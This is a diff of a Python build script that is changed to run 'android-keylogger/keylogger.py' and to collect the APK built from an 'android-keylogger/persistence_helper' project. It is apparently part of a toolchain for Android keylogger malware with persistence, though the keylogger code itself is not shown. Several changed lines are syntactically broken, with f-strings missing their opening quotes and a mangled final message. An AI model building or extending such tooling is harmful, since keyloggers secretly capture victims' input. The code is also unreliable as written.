@@ -7,25 +7,25 @@ import shutil
 def main():
     print("[*] Starting build automation...")
 
-    # 1. Look for file1.py in the current directory
-    if not os.path.exists("file1.py"):
-        print("[!z] Error: file1.py not found in the current directory.")
+    # 1. Look for keylogger.py in android-keylogger/ directory
+    script_path = os.path.join("android-keylogger", "keylogger.py")
+    if not os.path.exists(script_path):
+        print(f[!] Error: {script_path} not found.")
         return
 
-    # 2. Run: python file1.py
-    print("[*] Running file1.py...")
-
+    # 2. Run: python android-keylogger/keylogger.py
+    print(f[*] Running {script_path}...")
     try:
-        subprocess.run(["python", "file1.py"], check=True)
+        subprocess.run(["python", script_path], check=True)
     except subprocess.CalledProcessError as e:
-        print(f[!z] Error executing file1.py: {e}")
+        print(f[!] Error executing {script_path}: {e}")
         return
     except FileNotFoundError:
         print("[!] Error: 'python' command not found. Make sure it's in your PATH.")
         return
 
-    # 3. Look for the output APK in persistence_helper/app/build/outputs/apk/debug/
-    apk_dir = os.path.join("persistence_helper", "app", "build", "outputs", "apk", "debug")
+    # 3. Look for the output APK in android-keylogger/persistence_helper/app/build/outputs/apk/debug/
+    apk_dir = os.path.join("android-keylogger", "persistence_helper", "app", "build", "outputs", "apk", "debug")
     apk_path = None
 
     if os.path.exists(apk_dir):
@@ -61,9 +61,9 @@ def main():
             f.write("Build completed: app.apk\n")
         print(f[*] Created report at {report_path}")
     except Exception as e:
-        print("[!] Error creating report: {e}")
+        print(f"[!] Error creating report: {e}")
 
-    print("[+] All done, Jack.")
+    print("[+ All done, Jack.")
 
 if __name__ == "__main__":
     main()
